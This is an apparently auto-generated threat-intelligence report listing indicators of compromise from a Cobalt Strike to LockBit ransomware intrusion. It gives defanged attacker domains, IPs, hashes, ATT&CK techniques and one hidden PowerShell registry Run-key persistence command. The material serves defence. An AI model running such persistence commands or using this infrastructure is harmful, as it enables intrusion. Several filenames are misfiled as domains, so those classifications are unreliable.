# Cobalt Strike and a Pair of SOCKS Lead to LockBit Ransomware

## 📋 Report Metadata

**Issue:** [#18](https://github.com/apps-dfir/Security-Operations/issues/18)<br>
**Analyst:** Apramey 'Apps' Shurpali<br>
**Generated:** 2026-01-09 00:57:26 UTC<br>
**Sources Processed:** 1<br>
**OCR Enabled:** Yes

## 📚 Sources

1. [Cobalt Strike and a Pair of SOCKS Lead to LockBit Ransomware](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)

## 📊 Report Summary

**Total Unique IOCs:** 118<br>
**High Confidence IOCs:** 88<br>
**MITRE ATT&CK Techniques:** 30<br>
**Images with OCR Data:** 46<br>
**Previously Seen IOCs:** 5<br>
**Breakdown:** URLs: 1, Domains: 41, IPs: 8, SHA256: 19, SHA1: 19, MD5: 22, Paths: 7, Commands: 1

## 🔄 Previously Seen IOCs

> The following IOCs were found in previous reports. This may indicate shared infrastructure, ongoing campaigns, or related threat activity.

| IOC | Type | Previous Reports |
|-----|------|------------------|
| `NTDS[.]dit` | DOMAINS | [#6: CISA-PDF Reports & Links](../../issues/6) |
| `Nltest[.]EXE` | DOMAINS | [#1: Unit42 Blogs](../../issues/1) |
| `Whoami[.]EXE` | DOMAINS | [#1: Unit42 Blogs](../../issues/1) |
| `cmd[.]exe` | DOMAINS | [#1: Unit42 Blogs](../../issues/1), [#3: Multiple Threat Actors Exploit React2Shell (CVE-2025-55182)](../../issues/3), [#8: Shai-Hulud 2.0: Guidance for detecting, investigating, and defending against the supply chain attack](../../issues/8) |
| `ntdsutil[.]exe` | DOMAINS | [#1: Unit42 Blogs](../../issues/1), [#6: CISA-PDF Reports & Links](../../issues/6) |

## Executive Summary (Analyst Fill-In)

### Key Takeaways
- What happened (1-2 bullets)
- Who/what is affected (orgs, sectors, regions)
- Why it matters to us (risk / exposure / priority)

### Initial Assessment
- Confidence level: (low/med/high)
- Recommended actions: (monitor / hunt / block / brief)

### Workflow Feedback (Analyst Fill-In)
- Extraction quality: (good / acceptable / poor)
- False positives noted: (none / some / many)
- Missing IOCs observed: (none / list below)
- Parsing issues: (none / describe)
- Suggestions for improvement:

## 🔍 Consolidated Indicators of Compromise

> IOCs are deduplicated across sources. Confidence: 🟢 HIGH | 🟡 MEDIUM | 🔴 LOW

### URLs

- 🟢 `hxxps://accessservicesonline[.]com/setup_wm[.]exe` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)

### Domains

- 🟢 `1768[.]py` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `MEGA[.]io` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `NTDS[.]dit` *(Seen 2x: Issue #6)* [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `accessservicesonline[.]com` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `compdatasystems[.]com` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `detection[.]fyi` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `qaz[.]im` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `retailadvertisingservices[.]com` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `sigmasearchengine[.]com` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `temp[.]sh` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `user[.]compdatasystems` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `COPY[.]bat` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `COPY1[.]bat` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `DEF[.]bat` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `EXE[.]bat` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `EXE1[.]bat` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `Nltest[.]EXE` *(Seen 2x: Issue #1)* [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `PSEXESVC[.]exe` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `PsExec[.]exe` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `RDP[.]bat` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `SETUP[.]bat` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `WMI[.]bat` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `WMI1[.]bat` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `WUAUCLT[.]exe` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `Whoami[.]EXE` *(Seen 2x: Issue #1)* [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `Wmic[.]EXE` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `check[.]exe` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `cmd[.]exe` *(Seen 4x: Issue #1, #3, #8)* [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `comps1[.]txt` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `dfg[.]exe` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `domain[.]local` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `ds[.]exe` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `ntdsutil[.]exe` *(Seen 3x: Issue #1, #6)* [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `rclone[.]exe` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `sd[.]exe` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `svc[.]dll` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `svchost[.]exe` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `svchosts[.]exe` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `svcmc[.]dll` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `svcmcc[.]dll` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🔴 `wmiprvse[.]exe` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)

### IP Addresses

- 🟢 `159[.]100[.]14[.]254` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `185[.]236[.]232[.]20` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `195[.]2[.]70[.]38` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `31[.]172[.]83[.]162` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `38[.]180[.]61[.]247` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `46[.]21[.]250[.]52` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `91[.]142[.]74[.]28` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `93[.]115[.]26[.]127` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)

### File Hashes

**SHA256:**
- 🟢 `10ce939e4ee8b5285d84c7d694481ebbdf986904938d07f7576d733e830ed012` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `18051333e658c4816ff3576a2e9d97fe2a1196ac0ea5ed9ba386c46defafdb88` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `2389b3978887ec1094b26b35e21e9c77826d91f7fa25b2a1cb5ad836ba2d7ec4` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `3af3f2d08aa598ab4f448af1b01a5ad6c0f8e8982488ebf4e7ae7b166e027a8b` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `3f97e112f0c5ddf0255ef461746a223208dc0846bde2a6dca9c825d9c706a4e9` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `44cf04192384e920215f0e335561076050129ad7a43b58b1319fa1f950f6a7b6` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `53828f56c6894a468a091c8858d2e29144b68d5de8ff1d69a567e97aac996026` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `578a2ac45e40a686a5f625bbc7873becd8eb9fe58ea07b1d318b93ee0d127d4e` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `59c9d10f06f8cb2049df39fb4870a81999fd3f8a79717df9b309fadeb5f26ef9` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `7673a949181e33ff8ed77d992a2826c25b8da333f9e03213ae3a72bb4e9a705d` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `791157675ad77b0ae9feabd76f4b73754a7537b7a9a2cc74bd0924d65be680e1` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `9bcaad9184b182965923a141f52fb75ddd1975b99ab080869896cee5879ecfad` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `b4ad5df385ee964fe9a800f2cdaa03626c8e8811ddb171f8e821876373335e63` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `b79bb3302691936df7c3315ff3ba7027f722fc43d366ba354ac9c3dac2e01d03` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `ba9b879fdc304bd7f5554528fb8e858ef36ad4657fedfefb8495f43ce73fc6f1` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `c1173628f18f7430d792bbbefc6878bced4539c8080d518555d08683a3f1a835` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `c4863cc28e01713e6a857b940873b0e5caedfd1fcb9b2a8d07ffb4c0c48379d5` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `ced4ee8a9814c243f0c157cda900def172b95bb4bc8535e480fe432ab84b9175` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `d8b2d883d3b376833fa8e2093e82d0a118ba13b01a2054f8447f57d9fec67030` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)

**SHA1:**
- 🟢 `1ac66fcc34c0b86def886e4e168030dae096927c` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `450d54d5737164579416ca99af1eb3fa1d4aaff9` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `45337ae989cd62d07059f867ce62ff6b6fc90819` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `4a1e667e0c3550f4446903570adbe7776699d4ca` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `5263a135f09185aa44f6b73d2f8160f56779706d` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `5de1f72ffeea1ecbd287b0ca8ddb2c5264d9acb5` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `84019de427aef1f1e4f32b579767bee6d0bd1e64` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `9352236ad6fe8835979cf11ba5033f8f2fef0f19` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `956e020206c4dc4240537d07be022e86ed918ed1` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `aa19a1648d680c3bfbee7dcc3df41ce98af8e121` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `ab1777107d9996e647d43d1194922b810f198514` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `b077ea03b207cc8b8b48b9b4f9a58dabbd39f678` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `bba1bc3ebf07ca3c4e2442f0ba9ea18383ce627b` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `bf2b396b8fb0b1de27678aab877b6f177546d1c5` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `c59cbd309b3393cb08a1133364ed11000fdd418d` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `c6d54322a17e754150e61f7caa91226a84b0b774` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `ccc6b5bf9591fa9a3d57fd48ee0c9c49a6d22da9` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `da6771fbbcfaf195b80925cefc880794d62d61bf` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `e3619582f4d81ca180dee161bbe49d499b237119` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)

**MD5:**
- 🟢 `03af38505cee81b9d6ecd8c1fd896e0e` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `0aa05ebc3b6667954898cfccc4057600` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `0f7b6bb3a239cf7a668a8625e6332639` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `2800a10c4afae44978d906b2abaed745` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `303951d4c50efb2e991652225a6f02b1` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `40852fde665eb9119fcc565bd68de680` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `4457256150386acec794e9e8ee412691` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `4794accd22271a28547fb3613ee79218` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `573a213191985c555dd7e8de5f0a9cae` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `57f791f7477b1f7a1b3605465d054db8` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `6505b488d0c7f3eaee66e3db103d7b05` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `671b967eb2bc04a0cd892ca225eb5034` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `6d44c5fb49258f285769e50830fc59af` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `6e91c474d90546845b1f3f9e7a33411a` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `71c8c1a0056fd084bc32a03d9245ad10` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `8ed408107f89c53261bf74e58517bc76` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `90f9044cfee2c678fe51abd098bdfe97` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `996ad32c7ae2190b7fa7876df0d7b717` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `a0e9f5d64349fb13191bc781f81f42e1` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `b254f8f03e61bd9469df66c189d79871` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `d9adb3dd6df169e824b2867a2b8cba89` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `ea327ed0a3243847f7cd87661e22e1de` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)

### Windows Paths

- 🟢 `C:\share$\EXE1.bat` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `C:\share$\PsExec.exe` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `C:\share$\WMI1.bat` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `C:\share$\comps1.txt` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `C:\users` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `E:\REDACTED\customers` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)
- 🟢 `E:\REDACTED\domain` [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)

### Command Lines

🟢 Command:
```
powershell -WindowStyle hidden -Command "if (-Not (Test-Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\App')) { Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'App' -Value '%PUBLIC%\\Music\\svchosts.exe' }"
```
Sources: [[1]](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/)

## 🎯 MITRE ATT&CK Techniques

| Technique | Sources |
|-----------|---------|
| T1003.001: OS Credential Dumping: LSASS Memory | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1003.003: OS Credential Dumping: NTDS | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1018: Remote System Discovery | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1021.001: Remote Services: Remote Desktop Protocol | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1021.002: Remote Services: SMB/Windows Admin Shares | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1021.006: Remote Services: Windows Remote Management | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1021: Remote Services | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1036.005: Masquerading: Match Legitimate Resource Name or Location | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1036: Masquerading | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1047: Windows Management Instrumentation | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1048: Exfiltration Over Alternative Protocol | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1053.005: Scheduled Task/Job: Scheduled Task | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1055: Process Injection | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1057: Process Discovery | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1059.001: Command and Scripting Interpreter: PowerShell | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1059.003: Command and Scripting Interpreter: Windows Command Shell | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1069.002: Permission Groups Discovery: Domain Groups | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1071.001: Application Layer Protocol: Web Protocols | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1087.002: Account Discovery: Domain Account | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1090: Proxy | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1204.002: User Execution: Malicious File | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1218.011: System Binary Proxy Execution: Rundll32 | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1482: Domain Trust Discovery | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1486: Data Encrypted for Impact | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1552.001: Unsecured Credentials: Credentials In Files | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1562.001: Impair Defenses: Disable or Modify Tools | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1567.002: Exfiltration Over Web Service: Exfiltration to Cloud Storage | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1569.002: System Services: Service Execution | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |
| T1615: Group Policy Discovery | [1](https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/) |

## 📄 Source Details

> Expand each source for detailed information extracted from that article.

<details>
<summary><strong>Source 1: Cobalt Strike and a Pair of SOCKS Lead to LockBit Ransomware</strong></summary>

**URL:** https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/

**IOCs from this source:** 118<br>
**MITRE techniques:** 30

**Excerpt:**
> Key Takeaways This intrusion began with the download and execution of a Cobalt Strike beacon that impersonated a Windows Media Configuration Utility. The threat actor used Rclone to exfiltrate data from the environment. First they attempted FTP transfers, that failed, before moving to using MEGA.io . A day later they ran a second successful FTP exfiltration. The threat actor created several persistent backdoors in the environment, using scheduled tasks, GhostSOCKS and SystemBC proxies, and Cobal...

</details>

## 🔍 OCR Extracted Content

> Images extracted from source documents with OCR text. Click to expand each image.

<details>
<summary><strong>Image 1</strong> from cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware</summary>

**View Image:** [url_img_001_0cbb48f7aa3e.png](https://github.com/apps-dfir/Security-Operations/blob/main/peak/cti/data/ocr_images/url_img_001_0cbb48f7aa3e.png)

**IOCs Found:**
- `user.compdatasystems`
- `91.142.74.28`
- `svcmcc.dll`
- `195.2.70.38`
- `svemc.dll`
- `38.180.61.247`
- `185.236.232.20`

**Extracted Text:**
